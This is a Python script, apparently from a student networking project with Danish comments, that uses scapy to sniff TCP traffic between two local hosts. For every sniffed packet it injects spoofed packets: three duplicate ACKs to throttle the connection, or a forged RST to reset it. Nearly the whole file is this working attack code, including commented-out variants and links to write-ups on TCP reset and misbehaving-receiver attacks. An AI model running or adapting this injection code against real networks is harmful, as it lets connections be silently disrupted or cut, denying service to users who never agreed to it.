
from scapy.all import *
from random import randint

def send_3_duplicate_ack(p):

    src_ip = p[IP].src
    src_port = p[TCP].sport
    dst_ip = p[IP].dst
    dst_port = p[TCP].dport
    seq_val = p[TCP].seq
    ack_val = p[TCP].ack
    flags = p[TCP].flags

    # ack_packet = IP(src = dst_ip, 
    #                 dst = src_ip) / TCP(sport = dst_port,    
    #                                 dport = src_port, 
    #                                 flags = "A",   #Set ACK flag
    #                                 ack = seq_val, # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
    #                                 seq = ack_val)

    # ack_packet = IP(src = dst_ip, 
    #                 dst = src_ip) / TCP(sport = dst_port,    
    #                                 dport = src_port, 
    #                                 flags = "A",   #Set ACK flag
    #                                 ack = seq_val) # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
    ack_packet = IP(src = dst_ip, 
                    dst = src_ip) / TCP(sport = dst_port,    
                                    dport = src_port, flags = "A", ack = seq_val, seq = ack_val) #/ "Q"#/ "hejsa" # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
    
    # VED IKKE OM VI BEHØVER AT TILFØJE SEC NUMBER. ER IKKE SIKKER:: DE GØR DET IKKE I DERES EKSEMPEL FRA GITHUB

    # er ACK pakker ligeglade med seq nummeret? Nu klager den over at hejsa beskeden er out of seq.. men det er jo også data jeg sender, ikke ack
    # nej vent det giver da ingen mening? for den pakke jeg læser kigger vi på ack flaget.

    # ack_packet = IP(src = dst_ip, 
    #             dst = src_ip) / TCP(sport = dst_port,    
    #                             dport = src_port, 
    #                             flags = "A",   #Set ACK flag
    #                             ack = seq_val + randint(1,40), # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
    #                             seq = ack_val)
    
    # ack_packet = IP(src = dst_ip, 
    #             dst = src_ip) / TCP(sport = dst_port,    
    #                             dport = src_port, 
    #                             ack = seq_val, # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
    #                             seq = ack_val)

    #ack_packet.show()
    
    # 3 duplicate ack packets will trigger "fast retransmit" at reciever
    # send(ack_packet, verbose = 0)
    # ack_packet[TCP].seq = ack_packet[TCP].seq + 1 
    # send(ack_packet, verbose = 0)
    # ack_packet[TCP].seq = ack_packet[TCP].seq + 1 
    # send(ack_packet, verbose = 0)

    #send(ack_packet)
    send(ack_packet, verbose = 0)
    send(ack_packet, verbose = 0)
    send(ack_packet, verbose = 0)


    # DET SER UD TIL AT THROTTLE. MEN KUN MEGET LIDT. CA FRA 9 til 11 sekunder

    #print("3 ACK packets was send!") 

    return


def send_reset(p):

    src_ip = p[IP].src
    src_port = p[TCP].sport
    dst_ip = p[IP].dst
    dst_port = p[TCP].dport
    seq = p[TCP].seq
    ack = p[TCP].ack
    flags = p[TCP].flags

    rst_packet = IP(src = dst_ip, 
                    dst = src_ip) / TCP(sport = dst_port,    
                                    dport = src_port, 
                                    flags = "R", 
                                    seq = ack)

    send(rst_packet, verbose = 0)
    print("sending reset packet!") #(print after sending for speed)

    return

def tcp_throttling(source_addr: str, dest_addr: str, approach = "ACK"):

    #ERROR CHECK ADDRESSER
    print(f"dst host {dest_addr} and src host {source_addr}")


    #sniffed_packages = sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 100)
    #sniffed_package = sniff(filter = f"tcp", count = 5)
    #newest_packet = sniffed_packages[99] # latest packet 
    #package_sample1 = sniffed_packages[1]


    #print(newest_packet[TCP].ack)
    #print(package_sample1[TCP].ack)


    if approach == "ACK":
        #sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 200, prn = send_3_duplicate_ack) #NESP TÆNK OVER OM DET ER DET KORREKT AT SENDE 3 efter hver pakke
        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", prn = send_3_duplicate_ack) # KØR UENDELIGT

        # counter = 0
        # while True:
        #     single_packet = sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 1)[0]
        #     if not counter%3: # after 3 packets
        #         #update ack packet
        #         src_ip = single_packet[IP].src
        #         src_port = single_packet[TCP].sport
        #         dst_ip = single_packet[IP].dst
        #         dst_port = single_packet[TCP].dport
        #         seq_val = single_packet[TCP].seq
        #         ack_val = single_packet[TCP].ack
        #         flags = single_packet[TCP].flags
        #         ack_packet = IP(src = dst_ip, 
        #         dst = src_ip) / TCP(sport = dst_port,    
        #                         dport = src_port, 
        #                         flags = "A",   #Set ACK flag
        #                         ack = seq_val, # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
        #                         seq = ack_val)
        #     send(ack_packet, verbose = 0) 
        #     counter = counter+1
                
        ## https://reproducingnetworkresearch.wordpress.com/2017/06/05/cs244-17-reproducing-tcp-level-attacks-tcp-congestion-control-with-a-misbehaving-receiver/

    elif approach == "RST":

        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", prn = send_reset) 

        ## https://robertheaton.com/2020/04/27/how-does-a-tcp-reset-attack-work/

    else:
        raise ValueError("Incorrect or invalid approach")


def main():
    
    #tcp_throttling("192.168.1.203", "192.168.1.73", "RST")
    tcp_throttling("192.168.1.203", "192.168.1.73", "ACK")

    # ack_packet = IP(src = "192.168.1.73", 
    #         dst = "192.168.1.203") / TCP(sport = 123,    
    #                         dport = 123, flags = "A", seq=42) 
    # ack_packet = IP(src = "192.168.1.73", 
    #     dst = "192.168.1.203") / TCP(sport = 123,    
    #                     dport = 124, seq=42) 
    # ack_packet.show()
    # while True:
    #     try:
    #         send(ack_packet)
    #     except:
    #         print("fejl")
    

if __name__ == "__main__":
    main()

## https://github.com/robert/how-does-a-tcp-reset-attack-work/blob/master/main.py
## https://gist.github.com/spinpx/263a2ed86f974a55d35cf6c3a2541dc2
        